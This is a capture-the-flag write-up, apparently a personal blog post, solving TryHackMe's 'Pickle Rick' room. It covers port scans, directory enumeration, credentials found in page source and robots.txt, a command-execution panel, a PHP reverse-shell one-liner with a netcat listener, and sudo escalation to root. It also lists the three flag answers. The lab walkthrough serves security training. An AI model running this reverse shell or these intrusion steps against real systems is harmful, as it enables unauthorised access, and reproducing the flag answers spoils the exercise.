# TryHackMe - Pickle Rick (Write-Up)

_4 min read · March 2, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Pickle Rick**](https://tryhackme.com/room/picklerick) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Find 3 Ingredients
- Difficulty: Easy
- Machine Author: ar33zy and arebel

---

## Scanning for Open Ports

The machine IP address in my case is **10.49.145.178**.

As usual:

```bash
nmap -T4 -p- 10.49.145.178
sudo nmap -sCV -p 22,80 10.49.145.178
```

![Nmap Output](./img/thm-picklerick/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first.

![Pickle Rick: Website](./img/thm-picklerick/web.png)

The webpage stated that:

- I need to logon to Rick's computer.
- Rick forgot the password.

I checked the page source and found the username hidden inside a comment:

```output
<!--Note to self, remember username! Username: R1ckRul3s-->
```

---

## Futher Enumeration on the Website

I used [**Dirsearch**](https://www.kali.org/tools/dirsearch/) to enumerate directories.

```bash
dirsearch -u http://10.48.159.183
```

![Dirsearch Output](./img/thm-picklerick/dirsearch-output.png)

First, I accessed `robots.txt`.

```output
Wubbalubbadubdub
```

I assumed this might be the password.

I tried logging in via SSH but I got permission denied.

Then I accessed `/login.php` and logged in using the discovered credentials.

Login successful.

---

## Command Panel (1st ingredient)

Inside, I found a 'Command Panel', which allows command execution.

I typed `ls`:

![Pickel Rick: Website Command Panel](./img/thm-picklerick/web-cmd.png)

When I typed `cat Sup3rS3cretPickl3Ingred.txt`, it returned:

```output
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
```

I checked the page source and found a **Base64** string (maybe).

```output
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
```

I tried to decode it:

```bash
echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d
```

However, the output looked encoded again, which suggests it may be encoded multiple times.

Instead of focusing on that, I tried another approach to read the ingredient file (`less`).

```output
mr. meeseek hair
```

I got the **first ingredient**!

I also checked the `clue.txt`:

```output
Look around the file system for the other ingredient.
```

---

## Gaining the Machine Shell (2nd ingredient)

Since the 'Command Panel' allows command execution, I attempted to gain a reverse shell using PHP:

```bash
php -r '$sock=fsockopen("192.168.223.226",4418);exec("/bin/bash <&3 >&3 2>&3");'
```

I set up a listener using [**netcat**](https://www.kali.org/tools/netcat/):

```bash
nc -lvp 4418
```

And I successfully received a reverse shell as `www-data`.

After gaining the shell, I started enumerating the system.

I navigated to `/home/rick` and found the **second ingredient**.

```bash
cd /home/rick
cat 'second ingredients'
```

```output
1 jerry tear
```

---

## Privilege Escalation (3rd ingredient)

Next, I did my privilege escalation checklist.

```bash
sudo -l
```

```output
User www-data may run the following commands on ip-10-48-159-183:
    (ALL) NOPASSWD: ALL
```

I switched to root, navigated to `/root` and retrieved the **last ingredient**.

```bash
sudo su
cd /root
ls -al
cat 3rd.txt
```

```output
3rd ingredients: fleeb juice
```

Bomba! Settleee.

---

## Session Terminated

Nothing much to say here, thank you for reading and see you next time!
